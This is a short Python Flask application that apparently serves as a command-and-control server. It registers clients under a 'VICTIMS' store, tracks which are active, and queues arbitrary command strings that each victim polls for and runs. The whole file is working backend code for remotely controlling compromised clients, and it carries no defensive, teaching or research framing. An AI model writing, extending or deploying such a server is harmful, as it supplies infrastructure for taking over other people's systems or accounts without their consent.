from flask import Flask, request, jsonify
import time

app = Flask(__name__)

# In-memory storage (Volatile: resets on restart)
# Structure: { match_userid: { "name": "...", "last_seen": 12345 } }
VICTIMS = {}

# Structure: { target_userid: "COMMAND_STRING" }
COMMAND_QUEUE = {}

@app.route('/')
def home():
    return "API Online"

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    if not data or 'userid' not in data or 'username' not in data:
        return jsonify({"error": "Invalid data"}), 400
    
    userid = str(data['userid'])
    VICTIMS[userid] = {
        "name": data['username'],
        "last_seen": time.time()
    }
    return jsonify({"status": "registered"})

@app.route('/poll/<userid>', methods=['GET'])
def poll(userid):
    userid = str(userid)
    # Update last seen
    if userid in VICTIMS:
        VICTIMS[userid]['last_seen'] = time.time()
    
    # Check for commands
    if userid in COMMAND_QUEUE:
        cmd = COMMAND_QUEUE[userid]
        del COMMAND_QUEUE[userid] # Consume command
        return jsonify({"command": cmd})
    
    return jsonify({"command": "NO_CMD"})

@app.route('/command', methods=['POST'])
def send_command():
    data = request.json
    if not data or 'target' not in data or 'command' not in data:
        return jsonify({"error": "Invalid data"}), 400
        
    target_id = str(data['target'])
    cmd = data['command']
    
    COMMAND_QUEUE[target_id] = cmd
    return jsonify({"status": "queued", "target": target_id, "cmd": cmd})

@app.route('/victims', methods=['GET'])
def get_victims():
    # Cleanup old victims (optional, > 60s timeout)
    now = time.time()
    active_victims = {}
    
    for uid, data in VICTIMS.items():
        if now - data['last_seen'] < 60: # Only show if seen in last minute
            active_victims[uid] = data
            
    return jsonify(active_victims)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
